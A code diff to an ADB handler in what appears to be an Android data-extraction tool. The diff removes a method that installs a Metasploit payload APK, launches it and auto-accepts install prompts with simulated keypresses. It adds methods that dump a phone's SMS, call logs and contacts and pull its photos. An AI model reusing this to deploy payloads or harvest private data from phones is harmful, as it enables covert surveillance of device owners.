@@ -3,12 +3,11 @@
 from typing import List, Dict
 from . import DEPENDENCY_PATH, CommandHandler, LogHandler, ARTIFACTS_PATH, FILE_PATH
 import time
-import json
 import os
-import threading
 import shutil
 import django
 import sys
+# import nmap
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'ArgusAPI.settings')
@@ -61,7 +60,7 @@ class AdbHandler:
         adb = ADBStatus.objects.create()
         adb.save()
         adbstatus = ADBStatus.objects.get(pk=1)
-        # Keep listing out the devices that are connected till we detect one
+        # Keep listing out the devices that are connected till we detect one using 
         while True:
             code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "devices"])
             #remove other lines
@@ -81,6 +80,8 @@ class AdbHandler:
                         continue
                     #notify the callback
                     LogHandler.LogHandler().logMessage("Detected ADB device with id: "+output[0])
+                    adbstatus.connec_status = "Device Connected Waiting for Device Info"
+                    adbstatus.save()
                     callback("Device Connected", adb_handler)
                     break
                 else:
@@ -107,12 +108,6 @@ class AdbHandler:
         code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "svc", "wifi", "enable"])
         code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "am", "start", "-n", "com.steinwurf.adbjoinwifi/.MainActivity", "-e", "ssid","argusVnet","-e","password_type","WPA","-e","password","argusVnet"])
 
-    def disable_mobile_data(self):
-        """
-        Disables the mobile data of the device
-        """
-        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "svc", "data", "disable"])
-
     def go_home(self):
         """
         Sends a home keypress to the android device
@@ -128,24 +123,12 @@ class AdbHandler:
         LogHandler.LogHandler().logMessage("Device is now in Wireless Debugging Mode on ip:"+ip+":5555")
         print("You can unplug the device from the PC Now")
 
-    def deploy_exploit(self):
+    def disable_mobile_data(self):
         """
-        Deploys the exploit to the device
+        Disables the mobile data of the device
         """
-        temp = threading.Thread(target = self.accept_install, name= "accept_install")
-        temp.start()
-        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "-e", "install", "-g", ARTIFACTS_PATH+"payload.apk",])
-        # we then start the apk that we just deployed and wait for a few seconds
-        LogHandler.LogHandler().logMessage("Deploying exploit onto device and launching")  
-        output = os.system(DEPENDENCY_PATH+"adb -e shell monkey -p com.metasploit.stage 1")
-        # # Accept the popup
-        # time.sleep(2)
-        # #tab
-        # self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "input", "keyevent", "61"])
-        # #enter
-        # self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "input", "keyevent", "66"])
-        #sleep for 5 seconds
-        time.sleep(5)
+        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "svc", "data", "disable"])
+
 
     def accept_install(self):
         """
@@ -154,13 +137,12 @@ class AdbHandler:
         time.sleep(1)
         #tab
         code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "-e", "shell", "input", "keyevent", "61"])
-        time.sleep(.3)
+        time.sleep(1)
         #tab
         code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "-e","shell", "input", "keyevent", "61"])
-        time.sleep(.3)
+        time.sleep(.5)
         #enter
         code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "-e","shell", "input", "keyevent", "66"])
-
 
 
     def get_contacts(self):
@@ -170,6 +152,22 @@ class AdbHandler:
         #creates the temporary file that we ne
         code, output = self.command_handler.execute_as_bash([DEPENDENCY_PATH+"adb -e shell content query --uri content://contacts/phones/  --projection display_name:number:notes >> "+STORAGE_ROOT+"/data/contacts.txt"])
         LogHandler.LogHandler().logMessage("Contacts Obtained using adb")
+        return output
+    
+    def get_calllogs(self):
+        """
+        Gets the Call logs from the file
+        """
+        code, output = self.command_handler.execute_as_bash([DEPENDENCY_PATH+"adb -e shell content query --uri content://call_log/calls/ --projection number:date:type:duration:name >> "+STORAGE_ROOT+"/data/calllog.txt"])
+        LogHandler.LogHandler().logMessage("Call Logs Obtained using adb")
+        return output
+    
+    def get_sms(self):
+        """
+        Gets the SMS from the device
+        """
+        code, output = self.command_handler.execute_as_bash([DEPENDENCY_PATH+"adb -e shell content query --uri content://sms/ --projection address:body:type:status:date >> "+STORAGE_ROOT+"/data/sms.txt"])
+        LogHandler.LogHandler().logMessage("SMS Obtained using adb")
         return output
     
     def get_device_info(self):
@@ -186,7 +184,7 @@ class AdbHandler:
         code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "getprop", "ro.build.version.release"])
         android_version = output.strip()
         # Get the device model
-        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "getprop", "ro.product.model"])
+        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "getprop", "ro.product.marketname"])
         device_model = output.strip()
         # Get the device manufacturer
         code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "getprop", "ro.product.brand"])
@@ -224,7 +222,7 @@ class AdbHandler:
         # Copies all files from Pictures folder
         if not os.path.exists(ARTIFACTS_PATH+"Pictures/"):
             os.mkdir(ARTIFACTS_PATH+"Pictures/")
-        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "-e","pull", "/sdcard/Pictures", STORAGE_ROOT+"/files/"])
+        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "-e","pull", "/sdcard/Pictures", ARTIFACTS_PATH+"/files/"])
         LogHandler.LogHandler().logMessage("Photos from Pictures directory have been copied to local device")
         # #Copies all the files from whatsapp media folder
         # os.mkdir(ARTIFACTS_PATH="Whatsapp/")
@@ -235,7 +233,7 @@ class AdbHandler:
             for file in files:
                 try:
                     src_path = os.path.join(root, file)
-                    dst_path = os.path.join(STORAGE_ROOT, file)
+                    dst_path = os.path.join(STORAGE_ROOT+"/files/", file)
                     shutil.copy2(src_path, dst_path)  
                 except:
                     pass
